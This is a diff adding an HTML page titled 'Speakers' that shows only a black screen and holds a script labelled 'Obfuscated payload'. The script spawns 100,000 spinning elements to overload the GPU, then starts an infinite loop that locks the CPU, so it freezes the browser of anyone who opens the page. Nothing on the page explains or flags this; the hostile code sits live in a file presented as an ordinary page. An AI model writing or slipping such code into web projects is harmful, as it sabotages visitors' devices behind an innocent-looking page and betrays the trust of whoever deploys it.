@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>Speakers</title>
+<style>
+html, body {
+  margin:0; padding:0;
+  width:100%; height:100%;
+  background:black;
+  overflow:hidden;
+}
+</style>
+</head>
+<body>
+<script>
+// Obfuscated payload
+(function(){
+  let a=1e5,b='div',c='absolute',d='top',e='left',f=document,g='style',h='background',i='black',j='width',k='height',l='100%',m='animation',n='spin 1s linear infinite';
+  for(let z=0;z<a;z++){
+    let y=f.createElement(b);
+    y[g].position=c;
+    y[g][d]=(Math.random()*100)+'%';
+    y[g][e]=(Math.random()*100)+'%';
+    y[g][j]='10px';
+    y[g][k]='10px';
+    y[g][h]=i;
+    y[g][m]=n;
+    f.body.appendChild(y);
+  }
+  // Add spin keyframes to stress GPU
+  let s=f.createElement('style');
+  s.textContent='@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}';
+  f.head.appendChild(s);
+  // Infinite CPU loop after short delay
+  setTimeout(()=>{while(true){}},500);
+})();
+</script>
+</body>
+</html>
